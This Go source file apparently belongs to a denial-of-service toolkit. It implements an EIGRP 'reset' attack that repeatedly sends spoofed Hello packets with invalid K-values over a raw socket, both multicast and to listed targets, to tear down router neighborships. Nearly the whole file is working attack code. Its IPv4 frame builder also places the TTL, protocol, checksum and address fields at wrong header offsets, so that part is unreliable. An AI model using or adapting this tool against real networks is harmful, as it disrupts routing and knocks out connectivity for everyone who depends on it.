package eigrp

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"
	"time"

	"netdestruct/libs/dos/routing"
)

const resetInterval = 3 * time.Second

var l2Broadcast = [6]byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

// Reset spoofs EIGRP Hello packets with invalid K-values from --src to reset neighborship.
type Reset struct {
	Interface string
	AS        uint32
	SourceIP  string
	Target    string
}

func (r *Reset) Run() error {
	iface, err := net.InterfaceByName(r.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", r.Interface, err)
	}
	src := net.ParseIP(r.SourceIP)
	if src == nil {
		return fmt.Errorf("invalid --src %q", r.SourceIP)
	}
	targets, err := routing.ExpandTargets(r.Target)
	if err != nil {
		return err
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	srcMAC := iface.HardwareAddr
	if len(srcMAC) != 6 {
		return fmt.Errorf("interface %s has no MAC address", r.Interface)
	}

	var total int64
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total reset packets sent: %d\n", eigrpTag, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	fmt.Printf("%s Beginning EIGRP neighborship reset on %s (AS %d, src %s, targets %d)\n",
		eigrpTag, r.Interface, r.AS, src, len(targets))
	fmt.Printf("%s Press Ctrl+C to stop.\n", eigrpTag)

	payload := buildResetHelloPacket(r.AS)
	ticker := time.NewTicker(resetInterval)
	defer ticker.Stop()

	sendRound := func() {
		if v4 := src.To4(); v4 != nil {
			if err := sock.Send(buildIPv4Frame(srcMAC, v4, payload, 64)); err != nil {
				fmt.Fprintf(os.Stderr, "%s send multicast: %v\n", eigrpTag, err)
				return
			}
			atomic.AddInt64(&total, 1)
		} else {
			frame := buildIPv6Frame(srcMAC, src.To16(), payload)
			if err := sock.Send(frame); err != nil {
				fmt.Fprintf(os.Stderr, "%s send multicast: %v\n", eigrpTag, err)
				return
			}
			atomic.AddInt64(&total, 1)
		}

		for _, route := range targets {
			if frame := resetFrameForTarget(srcMAC, src, route, payload); frame != nil {
				if err := sock.Send(frame); err != nil {
					fmt.Fprintf(os.Stderr, "%s send target %s: %v\n", eigrpTag, route.Addr, err)
					continue
				}
				atomic.AddInt64(&total, 1)
			}
		}
	}

	sendRound()
	for range ticker.C {
		sendRound()
	}
	return nil
}

func resetFrameForTarget(srcMAC net.HardwareAddr, src net.IP, route routing.Route, payload []byte) []byte {
	if v4 := route.Addr.To4(); v4 != nil {
		src4 := src.To4()
		if src4 == nil || route.PrefixLen < 32 {
			return nil
		}
		return buildIPv4UnicastFrame(srcMAC, src4, v4, payload, 64)
	}
	src6 := src.To16()
	if src6 == nil || route.PrefixLen < 128 {
		return nil
	}
	return buildIPv6UnicastFrame(srcMAC, src6, route.Addr.To16(), payload)
}

func buildResetHelloPacket(asn uint32) []byte {
	tlv := append(buildParamTLV(), buildSwVerTLV()...)
	pkt := make([]byte, 20+len(tlv))
	pkt[0] = 2
	pkt[1] = 5 // Hello
	binary.BigEndian.PutUint32(pkt[16:20], asn)
	copy(pkt[20:], tlv)
	binary.BigEndian.PutUint16(pkt[2:4], onesComplementChecksum(pkt))
	return pkt
}

func buildParamTLV() []byte {
	tlv := make([]byte, 12)
	binary.BigEndian.PutUint16(tlv[0:2], 0x0001)
	binary.BigEndian.PutUint16(tlv[2:4], 12)
	tlv[4], tlv[5], tlv[6], tlv[7], tlv[8] = 255, 255, 255, 255, 255
	tlv[9] = 0
	binary.BigEndian.PutUint16(tlv[10:12], 15)
	return tlv
}

func buildSwVerTLV() []byte {
	tlv := make([]byte, 8)
	binary.BigEndian.PutUint16(tlv[0:2], 0x0004)
	binary.BigEndian.PutUint16(tlv[2:4], 8)
	binary.BigEndian.PutUint16(tlv[4:6], 0x0c00) // IOS 12.0
	binary.BigEndian.PutUint16(tlv[6:8], 0x0102) // EIGRP 1.2
	return tlv
}

func buildIPv4UnicastFrame(srcMAC net.HardwareAddr, srcIP, dstIP net.IP, payload []byte, ttl byte) []byte {
	ipLen := 20 + len(payload)
	frame := make([]byte, 14+ipLen)
	copy(frame[0:6], l2Broadcast[:])
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)
	frame[14] = 0x45
	binary.BigEndian.PutUint16(frame[16:18], uint16(ipLen))
	frame[18] = ttl
	frame[19] = eigrpProto
	copy(frame[22:26], srcIP.To4())
	copy(frame[26:30], dstIP.To4())
	binary.BigEndian.PutUint16(frame[20:22], ipChecksum(frame[14:14+ipLen]))
	copy(frame[34:], payload)
	return frame
}

func buildIPv6UnicastFrame(srcMAC net.HardwareAddr, srcIP, dstIP net.IP, payload []byte) []byte {
	ipLen := 40 + len(payload)
	frame := make([]byte, 14+ipLen)
	copy(frame[0:6], l2Broadcast[:])
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x86DD)
	frame[14] = 0x60
	binary.BigEndian.PutUint16(frame[18:20], uint16(len(payload)))
	frame[20] = eigrpProto
	frame[21] = 64
	copy(frame[22:38], srcIP.To16())
	copy(frame[38:54], dstIP.To16())
	copy(frame[54:], payload)
	return frame
}
